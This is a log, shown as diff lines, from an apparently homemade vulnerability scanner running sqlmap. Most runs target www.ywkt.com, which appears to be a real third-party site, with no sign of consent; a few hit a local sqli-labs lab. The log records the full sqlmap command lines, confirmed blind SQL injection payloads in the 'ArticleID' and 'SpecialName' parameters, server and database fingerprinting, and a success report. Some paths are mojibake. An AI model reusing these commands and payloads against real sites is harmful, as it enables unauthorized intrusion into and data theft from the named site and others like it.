+[19:24:11] [INFO] checking if the target is protected by some kind of WAF/IPS
+[19:24:12] [INFO] testing if the target URL content is stable
+[19:24:12] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[19:24:12] [INFO] testing if GET parameter 'ArticleID' is dynamic
+[19:24:13] [INFO] GET parameter 'ArticleID' appears to be dynamic
+[19:24:13] [INFO] heuristics detected web page charset 'utf-8'
+[19:24:14] [INFO] heuristic (basic) test shows that GET parameter 'ArticleID' might be injectable
+[19:24:14] [INFO] testing for SQL injection on GET parameter 'ArticleID'
+[19:24:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[19:24:15] [INFO] heuristics detected web page charset 'KOI8-R'
+[19:24:15] [INFO] GET parameter 'ArticleID' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[19:24:18] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[19:24:18] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[19:24:18] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[19:24:19] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[19:24:19] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[19:24:19] [INFO] testing 'MySQL inline queries'
+[19:24:19] [INFO] testing 'PostgreSQL inline queries'
+[19:24:19] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[19:24:20] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[19:24:20] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[19:24:20] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[19:24:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[19:24:21] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[19:24:21] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[19:24:21] [INFO] testing 'Oracle AND time-based blind'
+[19:24:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[19:24:21] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[19:24:26] [INFO] checking if the injection point on GET parameter 'ArticleID' is a false positive
+GET parameter 'ArticleID' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:
+---
+Parameter: ArticleID (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: ArticleID=51741 AND 8247=8247
+---
+[19:24:28] [INFO] testing MySQL
+[19:24:29] [WARNING] the back-end DBMS is not MySQL
+[19:24:29] [INFO] testing Oracle
+[19:24:29] [WARNING] the back-end DBMS is not Oracle
+[19:24:29] [INFO] testing PostgreSQL
+[19:24:29] [WARNING] the back-end DBMS is not PostgreSQL
+[19:24:29] [INFO] testing Microsoft SQL Server
+[19:24:29] [WARNING] the back-end DBMS is not Microsoft SQL Server
+[19:24:29] [INFO] testing SQLite
+[19:24:29] [WARNING] the back-end DBMS is not SQLite
+[19:24:29] [INFO] testing Microsoft Access
+[19:24:30] [INFO] confirming Microsoft Access
+[19:24:30] [INFO] the back-end DBMS is Microsoft Access
+web server operating system: Windows 8.1 or 2012 R2
+web application technology: ASP.NET, Microsoft IIS 8.5, ASP
+back-end DBMS: Microsoft Access
+[19:24:30] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 59 times
+[19:24:30] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\www.ywkt.com'
+
+[*] ending @ 19:24:30 /2018-12-10/
+
+
+-------------------------------------
+2018-12-10:19:26:57   F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.95\lib\python.exe F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.95\lib\sqlmap\sqlmap.py -u https://www.ywkt.com/Default.asp?BigClassName=鍚勯」閫氱煡璇勬瘮 --batch --thread=10 --random-agent
+-------------------------------------
+2018-12-10:19:28:26           ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.2.11.6#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:26:58 /2018-12-10/
+
+[19:26:58] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:1.6) Gecko/20040206 Firefox/1.0.1' from file 'F:\CODE\涓汉浣滃搧婧愪唬鐮乗涓汉婕忔壂椤圭洰\Langzi_瀹夊叏宸¤埅0.95\lib\sqlmap\txt\user-agents.txt'
+[19:26:59] [INFO] testing connection to the target URL
+[19:27:00] [INFO] testing if the target URL content is stable
+[19:27:00] [INFO] target URL content is stable
+[19:27:00] [INFO] testing if GET parameter 'BigClassName' is dynamic
+[19:27:02] [WARNING] GET parameter 'BigClassName' does not appear to be dynamic
+[19:27:02] [INFO] heuristics detected web page charset 'utf-8'
+[19:27:02] [WARNING] heuristic (basic) test shows that GET parameter 'BigClassName' might not be injectable
+[19:27:03] [INFO] testing for SQL injection on GET parameter 'BigClassName'
+[19:27:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[19:27:04] [WARNING] reflective value(s) found and filtering out
+[19:27:09] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[19:27:09] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[19:27:12] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[19:27:14] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[19:27:14] [WARNING] if you experience problems with non-ASCII identifier names you are advised to rerun with '--tamper=charunicodeencode'
+[19:27:17] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[19:27:23] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[19:27:23] [INFO] testing 'MySQL inline queries'
+[19:27:24] [INFO] testing 'PostgreSQL inline queries'
+[19:27:25] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[19:27:25] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[19:27:25] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+[19:27:29] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[19:27:29] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[19:27:31] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[19:27:34] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[19:27:36] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[19:27:38] [INFO] testing 'Oracle AND time-based blind'
+[19:27:40] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[19:28:26] [WARNING] GET parameter 'BigClassName' does not seem to be injectable
+[19:28:26] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')
+[19:28:26] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 55 times
+
+[*] ending @ 19:28:26 /2018-12-10/
+
+
+-------------------------------------
+2018-12-10:19:28:35   [WARNING ERROR]HTTPSConnectionPool(host='www.ywkt.com', port=443): Max retries exceeded with url: /Default.asp?BigClassName=%E5%90%8D%E5%B8%88%E5%9C%A8%E7%BA%BF (Caused by ConnectTimeoutError(<urllib3.connection.VerifiedHTTPSConnection object at 0x00000000070B8B38>, 'Connection to www.ywkt.com timed out. (connect timeout=5)'))
+-------------------------------------
+2018-12-10:19:29:40   [WARNING ERROR]HTTP Error 500: Internal Server Error
+-------------------------------------
+2018-12-10:19:37:31   [WARNING ERROR](2003, "Can't connect to MySQL server on '107.151.82.178' (timed out)")
+-------------------------------------
+2018-12-10:19:37:41   [WARNING ERROR](2003, "Can't connect to MySQL server on '107.151.82.178' (timed out)")
+-------------------------------------
+2018-12-10:19:37:51   [WARNING ERROR](2003, "Can't connect to MySQL server on '107.151.82.178' (timed out)")
+-------------------------------------
+2018-12-10:19:38:01   [WARNING ERROR](2003, "Can't connect to MySQL server on '107.151.82.178' (timed out)")
+-------------------------------------
+2018-12-10:19:38:11   [WARNING ERROR](2003, "Can't connect to MySQL server on '107.151.82.178' (timed out)")
+-------------------------------------
+2018-12-10:19:38:21   [WARNING ERROR](2003, "Can't connect to MySQL server on '107.151.82.178' (timed out)")
+-------------------------------------
+2018-12-10:19:38:31   [WARNING ERROR](2003, "Can't connect to MySQL server on '107.151.82.178' (timed out)")
+-------------------------------------
+2018-12-10:19:38:41   [WARNING ERROR](2003, "Can't connect to MySQL server on '107.151.82.178' (timed out)")
+-------------------------------------
+2018-12-10:19:38:51   [WARNING ERROR](2003, "Can't connect to MySQL server on '107.151.82.178' (timed out)")
+-------------------------------------
+2018-12-10:19:39:01   [WARNING ERROR](2003, "Can't connect to MySQL server on '107.151.82.178' (timed out)")
+-------------------------------------
+2018-12-13:22:34:31   F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.95\lib\python.exe F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.95\lib\sqlmap\sqlmap.py -u http://127.0.0.1/sqli/Less-1/?id=1 --batch --thread=10 --random-agent
+-------------------------------------
+2018-12-13:22:34:38           ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.2.11.6#dev}
+|_ -| . [']     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 22:34:34 /2018-12-13/
+
+[22:34:34] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0' from file 'F:\CODE\涓汉浣滃搧婧愪唬鐮乗涓汉婕忔壂椤圭洰\Langzi_瀹夊叏宸¤埅0.95\lib\sqlmap\txt\user-agents.txt'
+[22:34:35] [INFO] testing connection to the target URL
+[22:34:36] [INFO] checking if the target is protected by some kind of WAF/IPS
+[22:34:36] [INFO] testing if the target URL content is stable
+[22:34:36] [INFO] target URL content is stable
+[22:34:36] [INFO] testing if GET parameter 'id' is dynamic
+[22:34:36] [INFO] GET parameter 'id' appears to be dynamic
+[22:34:36] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
+[22:34:37] [INFO] testing for SQL injection on GET parameter 'id'
+[22:34:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[22:34:37] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[22:34:37] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[22:34:37] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[22:34:37] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[22:34:37] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[22:34:37] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[22:34:37] [INFO] testing 'MySQL inline queries'
+[22:34:37] [INFO] testing 'PostgreSQL inline queries'
+[22:34:37] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[22:34:37] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[22:34:37] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[22:34:37] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[22:34:37] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[22:34:37] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[22:34:37] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[22:34:37] [INFO] testing 'Oracle AND time-based blind'
+[22:34:37] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[22:34:38] [WARNING] GET parameter 'id' does not seem to be injectable
+[22:34:38] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')
+
+[*] ending @ 22:34:38 /2018-12-13/
+
+
+-------------------------------------
+2018-12-13:22:36:18   F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.95\lib\python.exe F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.95\lib\sqlmap\sqlmap.py -u http://127.0.0.1/sqli/Less-1/?id=1 --batch --thread=10 --random-agent
+-------------------------------------
+2018-12-13:22:36:21           ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.2.11.6#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 22:36:19 /2018-12-13/
+
+[22:36:19] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.8) Gecko/2009032713 Ubuntu/9.04 (jaunty) Firefox/3.0.8' from file 'F:\CODE\涓汉浣滃搧婧愪唬鐮乗涓汉婕忔壂椤圭洰\Langzi_瀹夊叏宸¤埅0.95\lib\sqlmap\txt\user-agents.txt'
+[22:36:19] [INFO] testing connection to the target URL
+[22:36:19] [INFO] testing if the target URL content is stable
+[22:36:20] [INFO] target URL content is stable
+[22:36:20] [INFO] testing if GET parameter 'id' is dynamic
+[22:36:20] [INFO] GET parameter 'id' appears to be dynamic
+[22:36:20] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
+[22:36:20] [INFO] testing for SQL injection on GET parameter 'id'
+[22:36:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[22:36:20] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[22:36:21] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[22:36:21] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[22:36:21] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[22:36:21] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[22:36:21] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[22:36:21] [INFO] testing 'MySQL inline queries'
+[22:36:21] [INFO] testing 'PostgreSQL inline queries'
+[22:36:21] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[22:36:21] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[22:36:21] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[22:36:21] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[22:36:21] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[22:36:21] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[22:36:21] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[22:36:21] [INFO] testing 'Oracle AND time-based blind'
+[22:36:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[22:36:21] [WARNING] GET parameter 'id' does not seem to be injectable
+[22:36:21] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')
+
+[*] ending @ 22:36:21 /2018-12-13/
+
+
+-------------------------------------
+2018-12-13:22:38:22   F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.95\lib\python.exe F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.95\lib\sqlmap\sqlmap.py -u https://www.ywkt.com/default.asp?page=617^&BigClassName=^&SmallClassName=^&SpecialName=^&Action=^&keyword= --batch --thread=10 --random-agent
+-------------------------------------
+2018-12-13:22:38:25           ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.2.11.6#dev}
+|_ -| . [(]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 22:38:23 /2018-12-13/
+
+[22:38:23] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; pl; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18 (.NET CLR 3.5.30729; .NET4.0E)' from file 'F:\CODE\涓汉浣滃搧婧愪唬鐮乗涓汉婕忔壂椤圭洰\Langzi_瀹夊叏宸¤埅0.95\lib\sqlmap\txt\user-agents.txt'
+[22:38:23] [WARNING] provided value for parameter 'BigClassName' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
+[22:38:23] [WARNING] provided value for parameter 'SmallClassName' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
+[22:38:23] [WARNING] provided value for parameter 'SpecialName' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
+[22:38:23] [WARNING] provided value for parameter 'Action' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
+[22:38:23] [WARNING] provided value for parameter 'keyword' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
+[22:38:23] [INFO] resuming back-end DBMS 'microsoft access' 
+[22:38:23] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: SpecialName (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: page=617&BigClassName=&SmallClassName=&SpecialName=' AND 8247=8247 AND 'GIio'='GIio&Action=&keyword=
+---
+[22:38:25] [INFO] the back-end DBMS is Microsoft Access
+web server operating system: Windows 8.1 or 2012 R2
+web application technology: ASP.NET, Microsoft IIS 8.5, ASP
+back-end DBMS: Microsoft Access
+[22:38:25] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\www.ywkt.com'
+
+[*] ending @ 22:38:25 /2018-12-13/
+
+
+-------------------------------------
+2018-12-13:22:38:25   [SUCCESS]  {'url': 'https://www.ywkt.com/default.asp?page=617&BigClassName=&SmallClassName=&SpecialName=&Action=&keyword=', 'report_0': "\n\xe6\xb3\xa8\xe5\x85\xa5\xe5\x8f\x82\xe6\x95\xb0(\xe6\x96\xb9\xe5\xbc\x8f) : SpecialName (GET)\n    \xe6\xb3\xa8\xe5\x85\xa5\xe6\x96\xb9\xe5\xbc\x8f : boolean-based blind\n    \xe6\xb3\xa8\xe5\x85\xa5\xe6\xa0\x87\xe9\xa2\x98 : AND boolean-based blind - WHERE or HAVING clause\n    \xe6\xb3\xa8\xe5\x85\xa5\xe6\x94\xbb\xe5\x87\xbb : page=617&BigClassName=&SmallClassName=&SpecialName=' AND 8247=8247 AND 'GIio'='GIio&Action=&keyword=\n", 'common': 'F:\\CODE\\\xb8\xf6\xc8\xcb\xd7\xf7\xc6\xb7\xd4\xb4\xb4\xfa\xc2\xeb\\\xb8\xf6\xc8\xcb\xc2\xa9\xc9\xa8\xcf\xee\xc4\xbf\\Langzi_\xb0\xb2\xc8\xab\xd1\xb2\xba\xbd0.95\\lib\\python.exe F:\\CODE\\\xb8\xf6\xc8\xcb\xd7\xf7\xc6\xb7\xd4\xb4\xb4\xfa\xc2\xeb\\\xb8\xf6\xc8\xcb\xc2\xa9\xc9\xa8\xcf\xee\xc4\xbf\\Langzi_\xb0\xb2\xc8\xab\xd1\xb2\xba\xbd0.95\\lib\\sqlmap\\sqlmap.py -u https://www.ywkt.com/default.asp?page=617^&BigClassName=^&SmallClassName=^&SpecialName=^&Action=^&keyword= --batch --thread=10 --random-agent', 'report_1': '\xe6\x95\xb0\xe6\x8d\xae\xe5\xba\x93\xe7\xb1\xbb\xe5\x9e\x8b : Microsoft Access\n\xe6\x9c\x8d\xe5\x8a\xa1\xe5\x99\xa8\xe7\x89\x88\xe6\x9c\xac : Windows 8.1 or 2012 R2\n\xe6\x9c\x8d\xe5\x8a\xa1\xe5\x99\xa8\xe8\xaf\xad\xe8\xa8\x80 : ASP.NET, Microsoft IIS 8.5, ASP\n\xe6\x95\xb0\xe6\x8d\xae\xe5\xba\x93\xe7\x89\x88\xe6\x9c\xac : Microsoft Access\n', 'title': 'TITLE'}
